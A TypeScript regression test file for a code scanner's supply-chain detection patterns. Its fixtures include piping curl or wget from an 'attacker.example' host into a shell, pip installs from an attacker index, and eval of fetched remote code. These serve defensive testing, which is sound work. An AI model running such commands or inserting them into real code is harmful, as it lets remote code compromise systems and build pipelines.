// kcode-disable: audit
// P2.2 (v2.10.389) — supply-chain pack regression tests.

import { describe, expect, test } from "bun:test";
import { SUPPLY_CHAIN_PATTERNS } from "./supply-chain";

function findPattern(id: string) {
  const p = SUPPLY_CHAIN_PATTERNS.find((x) => x.id === id);
  if (!p) throw new Error(`Pattern not found: ${id}`);
  return p;
}

function matchAll(p: { regex: RegExp }, text: string): RegExpExecArray[] {
  const out: RegExpExecArray[] = [];
  p.regex.lastIndex = 0;
  const re = new RegExp(p.regex.source, p.regex.flags);
  let m: RegExpExecArray | null = re.exec(text);
  while (m) {
    out.push(m);
    if (!re.global) break;
    m = re.exec(text);
  }
  return out;
}

describe("supply-001-curl-pipe-shell", () => {
  const p = findPattern("supply-001-curl-pipe-shell");
  test("flags curl | sh", () => {
    expect(matchAll(p, "curl https://attacker.example/install.sh | sh").length).toBe(1);
  });
  test("flags wget | bash with sudo", () => {
    expect(matchAll(p, "wget https://x.example/get.sh | sudo bash").length).toBe(1);
  });
  test("does NOT flag curl writing to a file", () => {
    expect(matchAll(p, "curl -o install.sh https://example.com/install.sh").length).toBe(0);
  });
});

describe("supply-002-gha-pull-request-target-checkout-head", () => {
  const p = findPattern("supply-002-gha-pull-request-target-checkout-head");
  test("flags ref: head.sha", () => {
    const yaml = `      - uses: actions/checkout@v4
        with:
          ref: \${{ github.event.pull_request.head.sha }}`;
    expect(matchAll(p, yaml).length).toBe(1);
  });
  test("flags ref: head.ref", () => {
    const yaml = `          ref: \${{ github.event.pull_request.head.ref }}`;
    expect(matchAll(p, yaml).length).toBe(1);
  });
  test("does NOT flag ref: a static branch", () => {
    const yaml = `          ref: main`;
    expect(matchAll(p, yaml).length).toBe(0);
  });
});

describe("supply-003-pip-extra-index-url", () => {
  const p = findPattern("supply-003-pip-extra-index-url");
  test("flags pip install --extra-index-url", () => {
    expect(matchAll(p, "pip install requests --extra-index-url https://pypi.attacker.example").length).toBe(1);
  });
  test("flags --extra-index-url= form", () => {
    expect(matchAll(p, "pip install --extra-index-url=https://x.example/pypi/ pkg").length).toBe(1);
  });
  test("does NOT flag pip install without --extra-index-url", () => {
    expect(matchAll(p, "pip install requests").length).toBe(0);
  });
});

describe("supply-004-npm-token-hardcoded", () => {
  const p = findPattern("supply-004-npm-token-hardcoded");
  test("flags npm_<token> string", () => {
    // Synthetic-only fixture — alphanumeric body matches the token
    // shape (real npm tokens are npm_<base62>) without being a
    // valid token. The leading XXXXX makes it grep-safe.
    const code = `const token = "npm_XXXXFAKEXXXXNOTREALDONOTUSE0123456";`;
    expect(matchAll(p, code).length).toBe(1);
  });
  test("does NOT flag a generic 'npm_install' identifier", () => {
    const code = `const npm_install_status = "ok";`;
    expect(matchAll(p, code).length).toBe(0);
  });
});

describe("supply-005-eval-of-fetch", () => {
  const p = findPattern("supply-005-eval-of-fetch");
  test("flags eval(await fetch(...).text())", () => {
    const code = `const code = await fetch("https://x.example/code.js").then(r => r.text());
eval(code);`;
    // The naive form (eval(code) where code came from fetch). Our regex
    // matches the eval()/Function() with fetch() inside the arg list.
    const directForm = `eval(await fetch("https://x.example").then(r => r.text()))`;
    expect(matchAll(p, directForm).length).toBe(1);
  });
  test("flags new Function(... fetch(...)...)", () => {
    const code = `new Function('return ' + await fetch(url).text())()`;
    expect(matchAll(p, code).length).toBe(1);
  });
  test("does NOT flag a plain eval without fetch", () => {
    expect(matchAll(p, "eval('1 + 1')").length).toBe(0);
  });
});

// ─── Pack invariants ─────────────────────────────────────────────

describe("SUPPLY_CHAIN_PATTERNS pack invariants", () => {
  test("every pattern has pack='supply-chain'", () => {
    for (const p of SUPPLY_CHAIN_PATTERNS) {
      expect(p.pack).toBe("supply-chain");
    }
  });
  test("every pattern has a CWE", () => {
    for (const p of SUPPLY_CHAIN_PATTERNS) {
      expect(p.cwe).toBeTruthy();
    }
  });
  test("every pattern id is unique", () => {
    const ids = SUPPLY_CHAIN_PATTERNS.map((p) => p.id);
    expect(new Set(ids).size).toBe(ids.length);
  });
  test("every pattern id has the supply- prefix", () => {
    for (const p of SUPPLY_CHAIN_PATTERNS) {
      expect(p.id.startsWith("supply-")).toBe(true);
    }
  });
});
